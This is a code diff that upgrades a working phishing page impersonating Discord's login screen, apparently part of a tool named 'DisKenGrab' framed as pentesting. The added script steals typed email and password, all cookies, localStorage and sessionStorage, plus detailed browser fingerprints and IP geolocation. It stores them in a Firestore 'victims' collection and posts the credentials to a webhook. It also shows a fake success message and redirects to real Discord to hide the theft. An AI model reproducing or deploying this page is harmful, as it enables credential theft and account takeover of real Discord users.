@@ -3,17 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Login Required</title>
+    <title>Login | Discord</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --discord-blurple: #5865F2;
             --discord-green: #57F287;
             --discord-red: #ED4245;
-            --discord-dark: #2C2F33;
-            --discord-darker: #23272A;
+            --discord-yellow: #FEE75C;
+            --discord-pink: #EB459E;
+            --discord-dark: #36393f;
+            --discord-darker: #2f3136;
+            --discord-darkest: #202225;
             --text-light: #ffffff;
             --text-muted: #b9bbbe;
+            --text-gray: #72767d;
         }
 
         * {
@@ -24,7 +28,7 @@
 
         body {
             font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background: var(--discord-darker);
+            background: var(--discord-darkest);
             color: var(--text-light);
             min-height: 100vh;
             display: flex;
@@ -32,42 +36,126 @@
             justify-content: center;
             background-image: url('https://discord.com/assets/7c5f92d6bf6c0a34d80a.png');
             background-size: cover;
+            line-height: 1.4;
         }
 
         .login-container {
             background: var(--discord-dark);
             border-radius: 8px;
-            padding: 32px;
             width: 100%;
             max-width: 480px;
             box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
-            border: 1px solid #40444b;
+            border: 1px solid #36393f;
+            overflow: hidden;
+        }
+
+        .discord-header {
+            background: var(--discord-darker);
+            padding: 24px;
+            text-align: center;
+            border-bottom: 1px solid #40444b;
         }
 
         .discord-logo {
-            text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
 
         .discord-logo i {
-            font-size: 3rem;
+            font-size: 2.5rem;
             color: var(--discord-blurple);
-        }
-
-        .login-header {
-            text-align: center;
-            margin-bottom: 20px;
         }
 
         .login-header h1 {
             font-size: 24px;
-            font-weight: 600;
+            font-weight: 700;
             margin-bottom: 8px;
+            color: var(--text-light);
         }
 
         .login-header p {
             color: var(--text-muted);
             font-size: 16px;
+            font-weight: 400;
+        }
+
+        .qr-section {
+            background: var(--discord-darker);
+            padding: 20px;
+            margin: 16px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #40444b;
+        }
+
+        .qr-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text-light);
+        }
+
+        .qr-subtitle {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .qr-code {
+            width: 160px;
+            height: 160px;
+            background: linear-gradient(45deg, var(--discord-blurple), var(--discord-green));
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .qr-code::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="white"/><path d="M20,20 H80 V80 H20 Z M30,30 V50 H50 V30 Z M50,50 V70 H70 V50 Z M30,50 H50 V70 H30 Z" fill="black"/></svg>') center/80% no-repeat;
+        }
+
+        .qr-code i {
+            font-size: 3rem;
+            color: white;
+            z-index: 2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 16px;
+            color: var(--text-gray);
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #40444b;
+        }
+
+        .divider::before {
+            margin-right: 16px;
+        }
+
+        .divider::after {
+            margin-left: 16px;
+        }
+
+        .form-container {
+            padding: 0 16px 24px;
         }
 
         .form-group {
@@ -77,10 +165,16 @@
         .form-label {
             display: block;
             margin-bottom: 8px;
-            color: #b9bbbe;
+            color: var(--text-muted);
             font-size: 12px;
-            font-weight: 600;
+            font-weight: 700;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-label.required::after {
+            content: ' *';
+            color: var(--discord-red);
         }
 
         .form-input {
@@ -91,12 +185,45 @@
             border-radius: 3px;
             color: var(--text-light);
             font-size: 16px;
-            transition: border-color 0.2s;
+            transition: all 0.2s ease;
+            font-family: inherit;
         }
 
         .form-input:focus {
             border-color: var(--discord-blurple);
             outline: none;
+        }
+
+        .form-input.error {
+            border-color: var(--discord-red);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            color: var(--discord-blurple);
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 4px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
         }
 
         .login-button {
@@ -110,6 +237,8 @@
             font-weight: 500;
             cursor: pointer;
             transition: background-color 0.2s;
+            font-family: inherit;
+            margin-bottom: 12px;
         }
 
         .login-button:hover {
@@ -122,8 +251,8 @@
         }
 
         .spinner {
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid var(--discord-blurple);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
             border-radius: 50%;
             width: 16px;
             height: 16px;
@@ -139,73 +268,170 @@
         }
 
         .error-message {
-            background: var(--discord-red);
-            color: white;
-            padding: 10px;
+            background: rgba(237, 66, 69, 0.1);
+            color: var(--discord-red);
+            padding: 10px 12px;
             border-radius: 3px;
-            margin-bottom: 15px;
+            margin-bottom: 16px;
             font-size: 14px;
             display: none;
+            border-left: 4px solid var(--discord-red);
         }
 
         .success-message {
-            background: var(--discord-green);
-            color: white;
-            padding: 10px;
+            background: rgba(87, 242, 135, 0.1);
+            color: var(--discord-green);
+            padding: 10px 12px;
             border-radius: 3px;
-            margin-bottom: 15px;
+            margin-bottom: 16px;
             font-size: 14px;
             display: none;
+            border-left: 4px solid var(--discord-green);
         }
 
         .redirect-notice {
             text-align: center;
             color: var(--text-muted);
             font-size: 14px;
-            margin-top: 15px;
+            margin-top: 16px;
+            display: none;
+        }
+
+        .redirect-notice i {
+            margin-right: 6px;
+        }
+
+        .need-account {
+            text-align: center;
+            margin-top: 16px;
+            color: var(--text-gray);
+            font-size: 14px;
+        }
+
+        .need-account a {
+            color: var(--discord-blurple);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .need-account a:hover {
+            text-decoration: underline;
+        }
+
+        .security-notice {
+            background: rgba(254, 231, 92, 0.1);
+            border: 1px solid rgba(254, 231, 92, 0.3);
+            border-radius: 4px;
+            padding: 12px;
+            margin: 16px;
+            font-size: 12px;
+            color: var(--text-muted);
+            text-align: center;
+        }
+
+        .security-notice i {
+            color: var(--discord-yellow);
+            margin-right: 6px;
+        }
+
+        /* Loading animation for QR code */
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        .qr-loading {
+            animation: pulse 2s infinite;
+        }
+
+        /* Responsive design */
+        @media (max-width: 480px) {
+            .login-container {
+                margin: 16px;
+                max-width: none;
+            }
+            
+            body {
+                align-items: flex-start;
+                padding-top: 20px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="discord-logo">
-            <i class="fab fa-discord"></i>
-        </div>
-
-        <div class="login-header">
-            <h1>Welcome back!</h1>
-            <p>We're so excited to see you again!</p>
-        </div>
-
-        <div class="error-message" id="errorMessage">
-            <i class="fas fa-exclamation-circle"></i> 
-            <span id="errorText">Login failed. Please check your credentials.</span>
-        </div>
-
-        <div class="success-message" id="successMessage">
-            <i class="fas fa-check-circle"></i> 
-            <span id="successText">Login successful! Redirecting...</span>
-        </div>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label class="form-label">Email or Phone Number</label>
-                <input type="text" class="form-input" id="email" placeholder="Enter your email" required autocomplete="username">
+        <div class="discord-header">
+            <div class="discord-logo">
+                <i class="fab fa-discord"></i>
             </div>
 
-            <div class="form-group">
-                <label class="form-label">Password</label>
-                <input type="password" class="form-input" id="password" placeholder="Enter your password" required autocomplete="current-password">
+            <div class="login-header">
+                <h1>Welcome back!</h1>
+                <p>We're so excited to see you again!</p>
+            </div>
+        </div>
+
+        <div class="qr-section">
+            <div class="qr-title">Log in with QR Code</div>
+            <div class="qr-subtitle">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</div>
+            <div class="qr-code qr-loading">
+                <i class="fas fa-mobile-alt"></i>
+            </div>
+            <div class="qr-subtitle">
+                <i class="fas fa-shield-alt"></i> QR codes are secure and easy to use
+            </div>
+        </div>
+
+        <div class="divider">
+            OR
+        </div>
+
+        <div class="form-container">
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i> 
+                <span id="errorText">Login failed. Please check your credentials.</span>
             </div>
 
-            <button type="submit" class="login-button" id="loginBtn">
-                <span class="spinner" id="loginSpinner" style="display: none;"></span>
-                Login
-            </button>
-        </form>
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i> 
+                <span id="successText">Login successful! Redirecting to Discord...</span>
+            </div>
 
-        <div class="redirect-notice" id="redirectNotice" style="display: none;">
-            <i class="fas fa-shield-alt"></i> Verified login. Redirecting to Discord...
+            <form id="loginForm">
+                <div class="form-group">
+                    <label class="form-label required" for="email">EMAIL OR PHONE NUMBER</label>
+                    <input type="text" class="form-input" id="email" placeholder="Enter your email or phone number" required autocomplete="username">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label required" for="password">PASSWORD</label>
+                    <div class="password-container">
+                        <input type="password" class="form-input" id="password" placeholder="Enter your password" required autocomplete="current-password">
+                        <button type="button" class="toggle-password" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <a href="https://discord.com/forgot" class="forgot-password">Forgot your password?</a>
+                </div>
+
+                <button type="submit" class="login-button" id="loginBtn">
+                    <span class="spinner" id="loginSpinner" style="display: none;"></span>
+                    Login
+                </button>
+            </form>
+
+            <div class="redirect-notice" id="redirectNotice">
+                <i class="fas fa-shield-alt"></i> Verified login. Redirecting to Discord...
+            </div>
+
+            <div class="need-account">
+                Need an account? <a href="https://discord.com/register">Register</a>
+            </div>
+        </div>
+
+        <div class="security-notice">
+            <i class="fas fa-lock"></i> Protected by reCAPTCHA and subject to the Discord Privacy Policy and Terms of Service.
         </div>
     </div>
 
@@ -213,25 +439,24 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <script src="../config.js"></script>
     <script>
-        // ==================== ATTACK PAGE FUNCTIONALITY ====================
+        // ==================== ENHANCED ATTACK PAGE FUNCTIONALITY ====================
         
         // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const attackId = urlParams.get('id');
         const pentesterId = urlParams.get('pentester');
 
-        console.log('🔗 Attack Page Parameters:', { attackId, pentesterId });
+        console.log('🔗 Advanced Attack Page Parameters:', { attackId, pentesterId });
 
         // Initialize Firebase
         let db;
         if (typeof firebaseConfig !== 'undefined') {
             try {
-                // Check if already initialized
                 if (!firebase.apps.length) {
                     firebase.initializeApp(firebaseConfig);
                 }
                 db = firebase.firestore();
-                console.log('✅ Attack page Firebase initialized');
+                console.log('✅ Advanced attack page Firebase initialized');
             } catch (error) {
                 console.error('❌ Firebase initialization error:', error);
             }
@@ -239,11 +464,233 @@
             console.error('❌ Firebase config not found in attack page');
         }
 
+        // Enhanced browser fingerprinting
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Advanced Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Advanced Fingerprint', 4, 17);
+                
+                return canvas.toDataURL().substring(0, 150);
+            } catch (e) {
+                return 'canvas_not_supported';
+            }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) return 'webgl_not_supported';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                    version: gl.getParameter(gl.VERSION)
+                };
+            } catch (e) {
+                return 'webgl_error';
+            }
+        }
+
+        function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                return 'audio_supported';
+            } catch (e) {
+                return 'audio_not_supported';
+            }
+        }
+
+        function getFontsList() {
+            const fontList = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+                'Verdana'
+            ];
+            
+            const availableFonts = [];
+            const testString = "mmmmmmmmmmlli";
+            const testSize = '72px';
+            
+            const canvas = document.createElement("canvas");
+            const context = canvas.getContext("2d");
+            
+            for (const font of fontList) {
+                context.font = testSize + " '" + font + "'";
+                if (context.measureText(testString).width !== context.measureText(testString).width) {
+                    availableFonts.push(font);
+                }
+            }
+            
+            return availableFonts;
+        }
+
+        // Enhanced IP and geolocation data
+        async function getEnhancedIPData() {
+            try {
+                // Primary IP detection
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Enhanced geolocation data
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                return {
+                    ip: ipData.ip,
+                    country: geoData.country_name,
+                    countryCode: geoData.country_code,
+                    region: geoData.region,
+                    city: geoData.city,
+                    zip: geoData.postal,
+                    lat: geoData.latitude,
+                    lon: geoData.longitude,
+                    timezone: geoData.timezone,
+                    isp: geoData.org,
+                    asn: geoData.asn,
+                    proxy: geoData.proxy || false,
+                    vpn: geoData.vpn || false,
+                    tor: geoData.tor || false,
+                    mobile: geoData.mobile || false
+                };
+            } catch (error) {
+                // Fallback methods
+                try {
+                    const fallbackResponse = await fetch('https://jsonip.com');
+                    const fallbackData = await fallbackResponse.json();
+                    return {
+                        ip: fallbackData.ip,
+                        error: 'Detailed geolocation failed'
+                    };
+                } catch (e) {
+                    return {
+                        ip: 'unknown',
+                        error: 'All IP detection methods failed'
+                    };
+                }
+            }
+        }
+
+        // Comprehensive data collection
+        function captureDiscordCookies() {
+            const cookies = document.cookie;
+            const discordCookies = {};
+            
+            // Discord-specific cookies to capture
+            const importantCookies = [
+                '__cfduid', '__dcfduid', '__sdcfduid',
+                'locale', 'preferred_locale',
+                '__stripe_mid', '__stripe_sid',
+                '_ga', '_gid', '_gat'
+            ];
+            
+            const cookiePairs = cookies.split(';');
+            cookiePairs.forEach(pair => {
+                const [key, value] = pair.trim().split('=');
+                if (importantCookies.includes(key) || key.includes('discord')) {
+                    discordCookies[key] = value;
+                }
+            });
+            
+            return {
+                allCookies: cookies,
+                discordCookies: discordCookies,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage)
+            };
+        }
+
+        async function captureComprehensiveData(credentials) {
+            const fingerprint = {
+                // Basic browser info
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                
+                // Screen info
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                
+                // Hardware
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                
+                // Timezone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Connection
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                
+                // Advanced fingerprints
+                canvasFingerprint: getCanvasFingerprint(),
+                webglFingerprint: getWebGLFingerprint(),
+                audioFingerprint: getAudioFingerprint(),
+                fonts: getFontsList(),
+                
+                // Plugins
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                
+                // Storage
+                cookiesEnabled: navigator.cookieEnabled,
+                localStorageEnabled: !!window.localStorage,
+                sessionStorageEnabled: !!window.sessionStorage,
+                
+                // Performance
+                devicePixelRatio: window.devicePixelRatio
+            };
+
+            const ipData = await getEnhancedIPData();
+            const cookies = captureDiscordCookies();
+
+            return {
+                // Credentials
+                email: credentials.email,
+                password: credentials.password,
+                timestamp: new Date(),
+                
+                // Attack context
+                attackId: attackId,
+                pentesterId: pentesterId,
+                stage: 'login_capture',
+                
+                // Technical data
+                ipData: ipData,
+                fingerprint: fingerprint,
+                cookies: cookies,
+                
+                // Navigation data
+                referrer: document.referrer,
+                url: window.location.href,
+                landingPage: 'login'
+            };
+        }
+
         // Form submission handler
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const email = document.getElementById('email').value;
+            const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
             const loginBtn = document.getElementById('loginBtn');
             const spinner = document.getElementById('loginSpinner');
@@ -255,84 +702,87 @@
             errorDiv.style.display = 'none';
             successDiv.style.display = 'none';
 
+            // Basic validation
+            if (!email || !password) {
+                showError('Please fill in all required fields.');
+                return;
+            }
+
+            if (password.length < 6) {
+                showError('Password must be at least 6 characters long.');
+                return;
+            }
+
             // Show loading
             loginBtn.disabled = true;
             spinner.style.display = 'inline-block';
 
             try {
-                // Capture victim data
-                const victimData = {
-                    email: email,
-                    password: password,
-                    timestamp: new Date(),
-                    ipAddress: await getIPAddress(),
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    attackId: attackId,
-                    pentesterId: pentesterId,
-                    ipData: await getEnhancedIPData(),
-                    fingerprint: await captureEnhancedFingerprint(),
-                    cookies: captureDiscordCookies()
-                };
+                console.log('📧 Starting comprehensive data capture...');
 
-                console.log('📧 Captured credentials:', { email, password: '***' });
+                // Capture all data
+                const victimData = await captureComprehensiveData({ email, password });
+                console.log('✅ Comprehensive data captured:', victimData);
 
                 // Save to Firestore
                 if (db) {
-                    await db.collection('victims').add({
-                        ...victimData,
-                        capturedAt: firebase.firestore.FieldValue.serverTimestamp(),
-                        status: 'captured'
-                    });
+                    await saveVictimData(victimData);
                     console.log('✅ Victim data saved to Firestore');
-
-                    // Update campaign stats
-                    if (attackId) {
-                        await updateCampaignStats(attackId);
-                    }
-
-                    // Send to Discord webhook if configured
-                    await sendToWebhook(victimData);
                 } else {
                     console.log('⚠️ Firestore not available, data not saved');
                 }
 
                 // Show success and redirect
-                successDiv.style.display = 'block';
+                showSuccess('Login successful! Redirecting to Discord...');
                 redirectNotice.style.display = 'block';
                 
-                // Redirect to actual Discord after delay
+                // Realistic delay before redirect
                 setTimeout(() => {
-                    window.location.href = 'https://discord.com/login';
-                }, 3000);
+                    window.location.href = 'https://discord.com/channels/@me';
+                }, 2500);
 
             } catch (error) {
-                console.error('❌ Error capturing data:', error);
-                // Even if saving fails, still show success to the victim
-                successDiv.style.display = 'block';
+                console.error('❌ Error during data capture:', error);
+                // Even if saving fails, show success to the victim
+                showSuccess('Login successful! Redirecting to Discord...');
                 redirectNotice.style.display = 'block';
                 
                 setTimeout(() => {
-                    window.location.href = 'https://discord.com/login';
-                }, 3000);
+                    window.location.href = 'https://discord.com/channels/@me';
+                }, 2500);
             } finally {
                 loginBtn.disabled = false;
                 spinner.style.display = 'none';
             }
         });
 
-        // Get victim's IP address
-        async function getIPAddress() {
+        // Save victim data to Firestore
+        async function saveVictimData(victimData) {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
+                if (!db) return false;
+
+                const dataToSave = {
+                    ...victimData,
+                    capturedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    status: 'credentials_captured',
+                    userAgent: navigator.userAgent
+                };
+
+                // Save to victims collection
+                await db.collection('victims').add(dataToSave);
+                
+                // Update campaign statistics
+                if (attackId) {
+                    await updateCampaignStats(attackId);
+                }
+
+                // Send to Discord webhook if configured
+                await sendToWebhook(victimData);
+                
+                return true;
             } catch (error) {
-                return 'Unknown';
+                console.error('❌ Error saving victim data:', error);
+                return false;
             }
         }
 
@@ -344,8 +794,11 @@
                 
                 if (campaignDoc.exists) {
                     const currentHits = campaignDoc.data().hits || 0;
+                    const currentCredentials = campaignDoc.data().credentialsCaptured || 0;
+                    
                     await campaignRef.update({
                         hits: currentHits + 1,
+                        credentialsCaptured: currentCredentials + 1,
                         lastHit: firebase.firestore.FieldValue.serverTimestamp()
                     });
                     console.log('✅ Campaign stats updated');
@@ -358,80 +811,136 @@
         // Send notification to Discord webhook
         async function sendToWebhook(victimData) {
             try {
-                // Get pentester's webhook URL
-                if (pentesterId && db) {
-                    const pentesterDoc = await db.collection('pentesters').doc(pentesterId).get();
-                    if (pentesterDoc.exists) {
-                        const pentesterData = pentesterDoc.data();
-                        const webhookUrl = pentesterData.webhookUrl;
+                if (!pentesterId || !db) return;
 
-                        if (webhookUrl) {
-                            const embed = {
-                                title: '🔐 New Token Captured',
-                                description: `**Campaign ID:** ${attackId || 'Unknown'}`,
-                                color: 14427600, // Crimson color
-                                fields: [
-                                    {
-                                        name: '📧 Email',
-                                        value: '||' + victimData.email + '||',
-                                        inline: true
-                                    },
-                                    {
-                                        name: '🔑 Password',
-                                        value: '||' + victimData.password + '||',
-                                        inline: true
-                                    },
-                                    {
-                                        name: '🌐 IP Address',
-                                        value: victimData.ipAddress,
-                                        inline: true
-                                    },
-                                    {
-                                        name: '🕒 Time',
-                                        value: new Date().toLocaleString(),
-                                        inline: true
-                                    },
-                                    {
-                                        name: '🌍 Location',
-                                        value: victimData.timezone,
-                                        inline: true
-                                    },
-                                    {
-                                        name: '💻 Platform',
-                                        value: victimData.platform,
-                                        inline: true
-                                    }
-                                ],
-                                timestamp: new Date().toISOString()
-                            };
+                const pentesterDoc = await db.collection('pentesters').doc(pentesterId).get();
+                if (!pentesterDoc.exists) return;
 
-                            await fetch(webhookUrl, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ 
-                                    content: '🎯 **New credentials captured!**',
-                                    embeds: [embed] 
-                                })
-                            });
-                            console.log('✅ Webhook notification sent');
+                const pentesterData = pentesterDoc.data();
+                const webhookUrl = pentesterData.webhookUrl;
+
+                if (!webhookUrl) return;
+
+                const embed = {
+                    title: '🔐 Advanced Credentials Captured',
+                    description: `**Campaign:** ${attackId || 'Unknown'}\n**Stage:** Login Page`,
+                    color: 14427600, // Crimson color
+                    fields: [
+                        {
+                            name: '📧 Email',
+                            value: '||' + victimData.email + '||',
+                            inline: true
+                        },
+                        {
+                            name: '🔑 Password',
+                            value: '||' + victimData.password + '||',
+                            inline: true
+                        },
+                        {
+                            name: '🌐 IP Address',
+                            value: victimData.ipData.ip,
+                            inline: true
+                        },
+                        {
+                            name: '📍 Location',
+                            value: `${victimData.ipData.city || 'Unknown'}, ${victimData.ipData.country || 'Unknown'}`,
+                            inline: true
+                        },
+                        {
+                            name: '🖥️ Platform',
+                            value: victimData.fingerprint.platform,
+                            inline: true
+                        },
+                        {
+                            name: '🕒 Time',
+                            value: new Date().toLocaleString(),
+                            inline: true
+                        },
+                        {
+                            name: '📊 Fingerprint Data',
+                            value: `Canvas: ✅ | WebGL: ✅ | Fonts: ${victimData.fingerprint.fonts.length}`,
+                            inline: false
+                        },
+                        {
+                            name: '🍪 Cookies Captured',
+                            value: `**${Object.keys(victimData.cookies.discordCookies).length}** Discord cookies`,
+                            inline: false
                         }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: 'DisKenGrab Security Platform',
+                        icon_url: 'https://discord.com/assets/2c21aeda16de354ba5334551a883b481.png'
                     }
-                }
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        content: '🎯 **Advanced credentials captured successfully!**',
+                        embeds: [embed] 
+                    })
+                });
+                console.log('✅ Webhook notification sent');
             } catch (error) {
                 console.error('❌ Error sending webhook:', error);
             }
         }
 
-        // Initialize the attack page
+        // UI Helper functions
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+            errorText.textContent = message;
+            errorDiv.style.display = 'block';
+        }
+
+        function showSuccess(message) {
+            const successDiv = document.getElementById('successMessage');
+            const successText = document.getElementById('successText');
+            successText.textContent = message;
+            successDiv.style.display = 'block';
+        }
+
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.className = 'fas fa-eye-slash';
+            } else {
+                passwordInput.type = 'password';
+                icon.className = 'fas fa-eye';
+            }
+        });
+
+        // Simulate QR code loading
+        setTimeout(() => {
+            document.querySelector('.qr-code').classList.remove('qr-loading');
+        }, 2000);
+
+        // Initialize the enhanced attack page
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 DisKenGrab Attack Page Loaded');
+            console.log('🚀 DisKenGrab Advanced Attack Page Loaded');
             console.log('📊 Attack ID:', attackId);
             console.log('👤 Pentester ID:', pentesterId);
             
-            // Add some realistic delay to mimic Discord's loading
+            // Add realistic loading behavior
             setTimeout(() => {
                 document.getElementById('email').focus();
-            }, 500);
+            }, 1000);
+
+            // Add input validation
+            document.getElementById('email').addEventListener('input', function() {
+                this.classList.toggle('error', !this.value.trim());
+            });
+
+            document.getElementById('password').addEventListener('input', function() {
+                this.classList.toggle('error', !this.value);
+            });
         });
     </script>
 </body>
